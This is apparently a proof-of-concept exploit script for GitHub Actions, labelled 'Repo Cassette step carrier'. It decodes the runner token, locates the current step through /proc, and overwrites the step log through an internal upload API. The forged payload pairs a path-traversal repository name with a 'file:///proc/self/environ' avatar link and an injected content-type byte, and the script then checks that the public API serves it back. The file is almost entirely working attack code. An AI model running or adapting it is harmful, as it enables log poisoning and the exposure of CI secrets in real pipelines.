import fs from 'node:fs';
import https from 'node:https';
import path from 'node:path';

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({
        status: response.statusCode,
        headers: response.headers,
        body: Buffer.concat(chunks),
      }));
    });
    req.on('error', reject);
    req.setTimeout(15000, () => req.destroy(new Error('request timeout')));
    if (body) req.write(body);
    req.end();
  });
}

async function rpc(method, document) {
  const body = Buffer.from(JSON.stringify(document));
  const endpoint = new URL(
    `/twirp/results.services.receiver.Receiver/${method}`,
    process.env.ACTIONS_RESULTS_URL,
  );
  const response = await request(endpoint, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
  }, body);
  if (response.status < 200 || response.status >= 300) {
    throw new Error(`${method} returned ${response.status}: ${response.body.toString().slice(0, 180)}`);
  }
  return JSON.parse(response.body);
}

function currentStepBackendId() {
  const roots = new Set();
  let pid = process.pid;
  for (let depth = 0; depth < 12 && pid > 1; depth++) {
    try {
      const executable = fs.readlinkSync(`/proc/${pid}/exe`);
      let directory = path.dirname(executable);
      for (let parent = 0; parent < 5; parent++) {
        roots.add(directory);
        directory = path.dirname(directory);
      }
      const status = fs.readFileSync(`/proc/${pid}/status`, 'utf8');
      const match = status.match(/^PPid:\s+(\d+)$/m);
      if (!match) break;
      pid = Number(match[1]);
    } catch {
      break;
    }
  }
  const candidates = [];
  for (const root of roots) {
    const blocks = path.join(root, '_diag', 'blocks');
    if (!fs.existsSync(blocks)) continue;
    for (const name of fs.readdirSync(blocks)) {
      const match = name.match(
        /^[0-9a-f-]{36}_([0-9a-f-]{36})\.([0-9]+)$/i,
      );
      if (!match) continue;
      const fullPath = path.join(blocks, name);
      const stat = fs.statSync(fullPath);
      candidates.push({id: match[1], block: Number(match[2]), mtime: stat.mtimeMs});
    }
  }
  candidates.sort((a, b) => b.mtime - a.mtime || b.block - a.block);
  if (!candidates.length) throw new Error('current runner log block was not found');
  return candidates[0].id;
}

const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url'));
const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
if (!scope) throw new Error('Actions.Results scope is missing');
const [runBackendId, jobBackendId] = scope.split(':').slice(1);
const stepBackendId = currentStepBackendId();
const stepNumber = Number(process.env.CARRIER_STEP_NUMBER || '3');

const jobsResponse = await request(
  `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs`,
  {headers: {
    accept: 'application/vnd.github+json',
    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    'user-agent': 'repo-cassette-step-carrier',
    'x-github-api-version': '2022-11-28',
  }},
);
if (jobsResponse.status !== 200) {
  throw new Error(`job lookup returned ${jobsResponse.status}`);
}
const jobId = JSON.parse(jobsResponse.body).jobs?.[0]?.id;
if (!jobId) throw new Error('public job ID is missing');

const repository = `x/../${process.env.GITHUB_REPOSITORY}/actions/jobs/${jobId}/steps/${stepNumber}/logs`;
const payload = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette bound step-log carrier',
  stargazers_count: 0,
}));

const signed = await rpc('GetStepLogsSignedBlobURL', {
  workflow_run_backend_id: runBackendId,
  workflow_job_run_backend_id: jobBackendId,
  step_backend_id: stepBackendId,
});
if (!signed.logs_url) throw new Error('step log upload URL is missing');

const upload = await request(signed.logs_url, {
  method: 'PUT',
  headers: {
    'x-ms-blob-type': 'BlockBlob',
    'content-type': 'application/json\x85',
    'content-length': String(payload.length),
  },
}, payload);
if (upload.status !== 201) throw new Error(`step log upload returned ${upload.status}`);

await rpc('CreateStepLogsMetadata', {
  workflow_run_backend_id: runBackendId,
  workflow_job_run_backend_id: jobBackendId,
  step_backend_id: stepBackendId,
  uploaded_at: new Date().toISOString(),
  line_count: 1,
});

const carrier = {
  jobId,
  stepNumber,
  stepBackendId,
  route: repository,
  payloadSha256: (await import('node:crypto')).createHash('sha256').update(payload).digest('hex'),
  payloadBytes: payload.length,
  uploadStatus: upload.status,
};
console.log('BOUND_STEP_CARRIER', JSON.stringify(carrier));

const apiUrl = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}` +
  `/actions/jobs/${jobId}/steps/${stepNumber}/logs`;
let transport = {apiStatus: null};
for (let attempt = 0; attempt < 30; attempt++) {
  const api = await request(apiUrl, {headers: {
    accept: 'application/vnd.github+json',
    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    'user-agent': 'repo-cassette-step-carrier',
    'x-github-api-version': '2022-11-28',
  }});
  transport = {apiStatus: api.status};
  if (api.status === 302 && api.headers.location) {
    const targetUrl = new URL(api.headers.location);
    const target = await request(targetUrl, {headers: {
      'user-agent': 'repo-cassette-step-carrier',
    }});
    transport = {
      apiStatus: api.status,
      targetHost: targetUrl.host,
      targetPathSuffix: targetUrl.pathname.split('/').at(-1),
      rsct: targetUrl.searchParams.get('rsct'),
      targetStatus: target.status,
      contentType: target.headers['content-type'] || null,
      contentTypeHex: Buffer.from(target.headers['content-type'] || '', 'latin1').toString('hex'),
      bodyBytes: target.body.length,
      bodyMatches: target.body.equals(payload),
    };
    if (target.status === 200 && target.body.equals(payload)) break;
  }
  await new Promise(resolve => setTimeout(resolve, 200));
}

if (process.env.GITHUB_STEP_SUMMARY) {
  fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,
    '### Repo Cassette live step transport\n\n```json\n' +
    JSON.stringify({...carrier, transport}, null, 2) + '\n```\n');
}

await new Promise(resolve => setTimeout(resolve, 3000));
